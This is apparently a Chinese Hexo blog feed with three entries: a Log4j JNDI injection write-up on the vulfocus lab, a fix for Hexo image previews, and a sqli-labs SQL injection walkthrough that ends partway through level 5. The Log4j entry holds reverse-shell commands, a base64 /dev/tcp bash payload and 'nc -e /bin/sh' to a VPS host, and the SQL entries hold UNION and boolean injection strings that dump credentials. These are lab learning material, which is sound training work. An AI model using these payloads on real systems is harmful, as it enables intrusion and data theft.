        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>平台：vulfocus<br>工具：JNDI-Injection-Exploit</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><strong>准备本地攻击环境</strong><br>准备使用JNDI-Injection-Exploit反弹shell<br>构建shell<br><img src="https://img-blog.csdnimg.cn/7905a992254f45b6b45f4f1fc5a910b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>打开JNDI-Injection-Exploit</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash 1</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A VPS_IP</span><br><span class="line">bash 2</span><br><span class="line">java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;nc VPS_IP VPS_PORT -e /bin/sh&quot;</span> -A VPS_IP</span><br></pre></td></tr></table></figure><p>得到<strong>JNDI links</strong>，备好一会放在burp里面</p><p>监听9999端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 9999</span><br></pre></td></tr></table></figure><p><strong>在vulfocus打开在线靶机环境</strong><br><img src="https://img-blog.csdnimg.cn/c2993a2c056f41a8b51d61ceb816dac3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>抓包，根据提示更改包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /hello HTTP/1.1</span><br><span class="line">Host: vulfocus.fofa.so:63137</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 54</span><br><span class="line"></span><br><span class="line">payload=<span class="variable">$&#123;jndi:rmi://0.0.0.0/xgr2vd&#125;</span><span class="comment">#刚刚备好的JNDI links</span></span><br></pre></td></tr></table></figure><p>发动过去就得到反弹shell了，找到flag，一般在tmp<br><img src="https://img-blog.csdnimg.cn/a68e0274250f49e2856a0476d4c0fd8a.png" alt="在这里插入图片描述"></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>JNDI-exploit原理</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://vulfocus.fofa.so/">vulfocus在线环境</a><br><a href="https://ylcao.top/2021/12/apache-log4j2-rce%E5%A4%8D%E7%8E%B0/">Apache log4j2 rce复现</a><br><a href="https://www.cxyzjd.com/article/qq_40007043/107615314">漏洞复现系列–fastjson＜&#x3D;1.2.47反序列化漏洞_梦之旅行地-程序员宅基地</a><br><a href="https://x.hacking8.com/java-runtime.html">java命令执行payloads</a><br><a href="https://chowdera.com/2021/12/202112102325553772.html">Apache Log4j 2 远程代码执行漏洞（反弹shell）</a><br><a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases">JNDI-Injection-Exploit</a><br><a href="http://dnslog.cn/">http://dnslog.cn/</a><br><a href="https://www.cnblogs.com/Icedisaster/p/15675313.html">浅谈最近闹得火热的Log4j RCE漏洞</a><br><a href="https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce">CVE-2021-44228(Apache Log4j Remote Code Execution）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo预览失败问题浅解</title>
      <link href="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/"/>
      <url>/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="hexo预览失败问题浅解"><a href="#hexo预览失败问题浅解" class="headerlink" title="hexo预览失败问题浅解"></a>hexo预览失败问题浅解</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>在<code>VScode</code>上使用<code>Paste Image</code>插件,本地预览没有问题，本地预览不显示。原因位于hexo本身并不处理图片给定的图片路径，但是博客post下的文件会根据时间更改路径，导致出错。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>1、修改博客根目录<code>_config.yml</code>文件的配置项<code>post_asset_folder</code>为<code>true</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true <span class="comment">#在新建博文时，同目录下创建同名文件夹，为存放图片做准备</span></span><br></pre></td></tr></table></figure><p>2、修改<code>Paste Image</code>设置，保证文件存储到同名文件夹。</p><p><img src="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/2022-02-19-13-44-29.png">  </p><p>打开 <code>extension setting</code>，点击打开setting.json  </p><p><img src="/2022/02/19/hexo%E9%A2%84%E8%A7%88%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E6%B5%85%E8%A7%A3/2022-02-19-13-47-41.png"></p><p>添加如下两条：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;pasteImage.path&quot;</span>: <span class="string">&quot;$&#123;currentFileNameWithoutExt&#125;&quot;</span>,</span><br><span class="line"><span class="string">&quot;pasteImage.insertPattern&quot;</span>: <span class="string">&quot;$&#123;imageSyntaxPrefix&#125;./$&#123;currentFileNameWithoutExt&#125;/$&#123;imageFileName&#125;$&#123;imageSyntaxSuffix&#125;&quot;</span>,</span><br></pre></td></tr></table></figure><p>第一条保存照片到同名文件夹，第二条保存图片url为相对路径，方便配合后面的插件</p><p>3、安装插件</p><p>该插件可以把图片放在博文同名文件夹下，并修改图片访问路径。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>最后，可以快乐的复制粘贴了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/ea78bdd0551f">解决Hexo博客不显示图片的一种方法</a><br><a href="https://tanjuntao.github.io/2019/04/28/%E8%A7%A3%E5%86%B3hexo%E4%B8%AD%E5%8F%91%E5%B8%83%E6%96%87%E7%AB%A0%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/">解决hexo中发布文章后图片无法显示的问题</a><br><a href="https://github.com/mushanshitiancai/vscode-paste-image/blob/master/src/extension.ts">Paste Image</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> un_problems </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs</title>
      <link href="/2022/02/17/sqli-labs/"/>
      <url>/2022/02/17/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs通关浅解"><a href="#sqli-labs通关浅解" class="headerlink" title="sqli-labs通关浅解"></a>sqli-labs通关浅解</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p><strong>level-1报错型-字符型 注入</strong></p><p>1、在url后边加入GET参数id，并故意添加单引号，测试是否存在简单注入点，得到报错，说明存在注入点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/1256e96460c247a984fc8ca70620a95b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>2、判断字符还是整型注入。<br>测试如下url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>回显正常，说明为<strong>字符型</strong></p><p>原因</p><p><strong>字符型</strong>：where id&#x3D;’1 and 1&#x3D;2’，在引号内，遇到空格停止读取，等效于where id &#x3D;’1’。</p><p><strong>整型</strong>：where id&#x3D;1 and 1&#x3D;2，逻辑上会报错。</p><p>3、判断字段数。<br><a href="https://www.w3school.com.cn/sql/sql_orderby.asp">ORDER BY 语句用于对结果集进行排序。</a><br>显示的有三个信息，所以猜测有三个，判断字段数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan 1</span><br><span class="line">Your Login name:Dumb 2</span><br><span class="line">Your Password:Dumb 3</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; order by 3%23 正常</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-1/?id=1&#x27;</span> order by <span class="number">4</span>%<span class="number">23</span> 会报错，Unknown column <span class="string">&#x27;4&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span>，所以有三个字段</span><br></pre></td></tr></table></figure><p>4、爆数据库、表、字段和其他数据<br><a href="https://www.runoob.com/sql/sql-union.html">SQL UNION 操作符合并两个或多个 SELECT 语句的结果。</a></p><p>大白话：可以利用该特性进行个性化查询。</p><p>（1）爆数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,2,3%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d77c6b8868fc49f58289a55d540cf638.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以利用2，3字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">法<span class="number">1</span>：http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,database(),3%23</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:security 数据库名称</span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>法2：通用语句，爆数据库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(schema_name),3 from information_schema.schemata%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f71474a779ee4f2a9d3ece5d4283a937.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>（2）爆表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e456241396c94049b2f7503ebdf685ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>(3)爆字段，以其中表users为例</p><p><a href="https://blog.csdn.net/chenhualeguan/article/details/52956662?utm_source=blogxgwz0">数据库中INFORMATION_SCHEMA的说明及使用</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/806f61ac76d04559bb070e932094825a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看其中的部分数据，如username,password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(username,password),3 from users%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d006dcf3400e41a59ad78edba2dbffda.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p><strong>level-2报错型-整型 注入</strong><br>1、测试是否有简单注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>得到报错,存在简单注入  </p><p>2、判断字符型还是整型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> 正常</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> 错误</span><br></pre></td></tr></table></figure><p>说明为整型<br>3、爆字段数、数据库、表、字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> order by <span class="number">4</span><span class="comment">#  //爆字段数</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-27-37.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#  //查看可泄露字段</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-30-51.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,database(),<span class="number">3</span><span class="comment"># //查看当前数据库名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-32-32.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment"># //查看所有数据库名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-36-35.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables where table_schema=database()<span class="comment"># //查看当前数据库所有表名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-37-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span><span class="comment"># //查看当前数据库某一表的全部字段名，以users为例</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-39-53.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(username,password),<span class="number">3</span> <span class="keyword">from</span> users<span class="comment"># //查看当前数据库某一表的部分字段内容，以users为例</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-41-40.png"></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p><strong>level3 报错-单引号-小括号-字符型-注入</strong><br>1、是否存在简单注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; 报错，存在简单注入</span></span><br></pre></td></tr></table></figure><p>2、判断注入类型<br><img src="/2022/02/17/sqli-labs/2022-02-18-11-05-13.png"><br>对比一般的简单字符型注入，多出来一个单括号，所以推测后端代码 为 <code> WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code><br>所以注入类型为<strong>报错-单引号-小括号-字符型-sql注入</strong>，接下来构造语句时只需要保证单引号、括号闭合即可</p><p>4、爆字段数、数据库等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;)order by 4 %23  //爆字段数</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-13-47.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,2,3 %23 //包显性字段 </span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-15-19.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,database(),3 %23 //爆数据库</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-16-09.png"><br>接下来同level1\2，不展示了</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p><strong>报错-双引号-小括号-字符型-sql注入</strong>  </p><p>1、测判断否存在简单注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; //正常，排除单引号报错</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; //报错</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-27-15.png"><br>看到双引号，判断为<strong>报错-双引号-小括号-字符型-sql注入</strong>，推测后端查询语句为<br><code>where id = (&quot;$id&quot;) LIMIT 0,1; </code><br>2、爆字段数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot;) order by 4%23 //保证闭合即可</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-13-25.png"><br>3、爆显性字段   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,2,3 %23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-14-22.png"><br>4、爆数据库、表名、字段等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,database(),3 %23 //爆数据库名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-17-52.png"><br>后面和level1\2\3一样，不展示了</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p><strong>报错回显&#x2F;布尔-字符型-注入</strong><br>1、布尔注入<br>回显只有正确和无，但是判断确实存在注入的情况。<br>设计语句返回true&#x2F;false 一点点爆破数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or 1=1%23  成功通过，存在布尔注入</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-23-08-21.png">  </p><p>布尔注入常用函数及语句:<a href="#refer-anchor-1"><sup>1</sup></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="built_in">str</span>)：返回<span class="built_in">str</span>字符串的长度。</span><br><span class="line">substr(<span class="built_in">str</span>, pos, <span class="built_in">len</span>)：将<span class="built_in">str</span>从pos位置开始截取<span class="built_in">len</span>长度的字符进 行返回。注意这里的pos位置是从<span class="number">1</span>开始的，不是数组的<span class="number">0</span>开始</span><br><span class="line">mid(<span class="built_in">str</span>,pos,<span class="built_in">len</span>):跟上面的一样，截取字符串</span><br><span class="line"><span class="built_in">ascii</span>(<span class="built_in">str</span>)：返回字符串<span class="built_in">str</span>的最左面字符的ASCII代码值。</span><br><span class="line"><span class="built_in">ord</span>(<span class="built_in">str</span>):同上，返回<span class="built_in">ascii</span>码</span><br><span class="line"><span class="keyword">if</span>(a,b,c) :a为条件，a为true，返回b，否则返回c，如<span class="keyword">if</span>(<span class="number">1</span>&gt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>),返回<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>布尔注入常用语句：<a href="#refer-anchor-1"><sup>1</sup></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>判断数据库长度 </span><br><span class="line"><span class="string">&#x27; or Length(database()) = 8 #返回true说明数据库长度为8</span></span><br><span class="line"><span class="string">2.获取数据库名字</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="built_in">ord</span>(mid(database(),<span class="number">1</span>,<span class="number">1</span>)) =<span class="string">&#x27;ascill值&#x27;</span><span class="comment">#</span></span><br><span class="line">依次获取</span><br><span class="line"><span class="number">3.</span>获取表的总数</span><br><span class="line"><span class="string">&#x27; or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= 2#</span></span><br><span class="line"><span class="string">4.获取表的长度(第一个表)</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> (select length(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES where TABLE_SCHEMA=database() limit <span class="number">0</span>,<span class="number">1</span> )= (猜测得长度)<span class="comment">#</span></span><br><span class="line"><span class="number">5.</span>获取表的内容</span><br><span class="line"><span class="string">&#x27; or  mid((select TABLE_NAME from information_schema.TABLES where </span></span><br><span class="line"><span class="string">TABLE_SCHEMA=database() limit 0,1),1,1)   = &#x27;</span>a<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">6.获取表的字段的总数</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span>  (select count(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS where TABLE_NAME=表名 ) = <span class="number">8</span><span class="comment">#8返回true说明有8个表</span></span><br><span class="line">依次类推,最后推出内容</span><br></pre></td></tr></table></figure><p>写了一些脚本，顺便学习了python多线程。<br>2、报错注入<a href="#refer-anchor-2"><sup>2</sup></a><br>(1). 